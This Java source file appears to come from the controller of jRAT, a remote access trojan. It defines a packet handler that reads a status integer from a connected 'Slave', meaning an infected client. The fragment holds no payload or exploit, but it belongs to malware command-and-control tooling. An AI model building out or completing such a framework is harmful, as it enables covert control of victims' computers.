package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;

public class Packet2Status extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int status = dis.readInt();
		slave.setStatus(status);
		
	}
}
